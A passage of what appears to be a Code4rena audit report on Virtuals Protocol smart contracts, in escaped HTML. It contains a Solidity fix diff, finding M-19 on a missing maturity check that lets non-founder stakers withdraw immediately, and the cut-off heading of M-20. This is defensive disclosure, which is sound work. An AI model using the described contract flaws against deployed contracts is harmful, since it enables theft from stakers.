class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256[] calldata distributeAgentTokenUserAmounts,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address creator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) external onlyRole(FACTORY_ROLE) nonReentrant whenNotCancelled whenNotFailed whenEnded returns (address) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(refundUserCountForFailed == 0, \u0026quot;OnGenesisFailed already called\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            refundVirtualsTokenUserAddresses.length == refundVirtualsTokenUserAmounts.length,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Mismatched refund arrays\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            distributeAgentTokenUserAddresses.length == distributeAgentTokenUserAmounts.length,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Mismatched distribution arrays\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Calculate total refund amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 totalRefundAmount = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; refundVirtualsTokenUserAmounts.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // check if the user has enough virtuals committed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                mapAddrToVirtuals[refundVirtualsTokenUserAddresses[i]] \u0026gt;= refundVirtualsTokenUserAmounts[i],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u0026quot;Insufficient Virtual Token committed\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            totalRefundAmount += refundVirtualsTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Check if launch has been called before\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        bool isFirstLaunch = agentTokenAddress == address(0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Calculate required balance based on whether this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 requiredVirtualsBalance = isFirstLaunch ? totalRefundAmount + reserveAmount : totalRefundAmount;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Check if contract has enough virtuals balance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(virtualTokenAddress).balanceOf(address(this)) \u0026gt;= requiredVirtualsBalance,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Insufficient Virtual Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Only do launch related operations if this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (isFirstLaunch) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // grant allowance to agentFactoryAddress for launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(virtualTokenAddress).approve(agentFactoryAddress, reserveAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // Call initFromBondingCurve and executeBondingCurveApplication\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            uint256 id = IAgentFactoryV3(agentFactoryAddress).initFromBondingCurve(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                string.concat(genesisName, \u0026quot; by Virtuals\u0026quot;),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                genesisTicker,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                genesisCores,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                tbaSalt,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                tbaImplementation,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                daoThreshold,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                reserveAmount,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                creator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            address agentToken = IAgentFactoryV3(agentFactoryAddress).executeBondingCurveApplication(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                id,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                agentTokenTotalSupply,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                agentTokenLpSupply,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                address(this) // vault\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            require(agentToken != address(0), \u0026quot;Agent token creation failed\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // Store the created agent token address\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            agentTokenAddress = agentToken;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Calculate total distribution amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 totalDistributionAmount = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; distributeAgentTokenUserAmounts.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            totalDistributionAmount += distributeAgentTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Check if contract has enough agent token balance only after agentTokenAddress be set\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(agentTokenAddress).balanceOf(address(this)) \u0026gt;= totalDistributionAmount,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Insufficient Agent Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Directly transfer Virtual Token refunds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; refundVirtualsTokenUserAddresses.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // first decrease the virtuals mapping of the user to prevent reentrancy attacks\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            mapAddrToVirtuals[refundVirtualsTokenUserAddresses[i]] -= refundVirtualsTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // then transfer the virtuals\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(virtualTokenAddress).safeTransfer(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                refundVirtualsTokenUserAddresses[i],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                refundVirtualsTokenUserAmounts[i]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            emit RefundClaimed(genesisId, refundVirtualsTokenUserAddresses[i], refundVirtualsTokenUserAmounts[i]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // save the amount of agent tokens to claim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; distributeAgentTokenUserAddresses.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-            claimableAgentTokens[distributeAgentTokenUserAddresses[i]] = distributeAgentTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+            claimableAgentTokens[distributeAgentTokenUserAddresses[i]] += distributeAgentTokenUserAmounts[i]; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit GenesisSucceeded(genesisId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return agentTokenAddress;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals\" style=\"position:relative;\"\u003e\u003ca href=\"#m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals\" aria-label=\"m 19 lack of maturity check for non founder users allowing immediate withdrawals permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-128\"\u003e[M-19] Lack of maturity check for non-founder users allowing immediate withdrawals\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-700\"\u003ePelz\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-847\"\u003eaiota\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-393\"\u003egregom\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-149\"\u003eIshenxx\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L95\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-6\" aria-label=\"finding description and impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003eAgentVeToken::withdraw()\u003c/code\u003e function, the contract contains a check for the maturity of stakes, but this check only applies to the founding staker (\u003ccode\u003efounder\u003c/code\u003e). The condition is:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"102\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; ((\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematureAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not mature yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis ensures that the founding staker must wait for a lockup period before withdrawing if their balance falls below \u003ccode\u003einitialLock\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eHowever, there is no such lockup or maturity check for non-founder users. If \u003ccode\u003ecanStake\u003c/code\u003e is enabled for all users, any user who stakes tokens can withdraw immediately, bypassing any intended lockup or maturity period. This flaw effectively removes any staking or lockup incentive for users who stake their tokens, as they can withdraw at will without any restriction.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo address this issue, a maturity check should be applied to all users who stake tokens. This would ensure that all users are subject to the same withdrawal restrictions, and their stakes are locked for a specified period before they can withdraw. Recommended approach:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eImplement the lockup for non-founder users:\u003c/strong\u003e Ensure that all users, not just the founder, are locked in for a set period before being allowed to withdraw. You could add logic to set a different lockup period for different classes of users if needed.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity\" style=\"position:relative;\"\u003e\u003ca href=\"#m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity\" aria-label=\"m 20 delegation not revoked on withdrawal allows reward and voting power inflation post maturity permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" 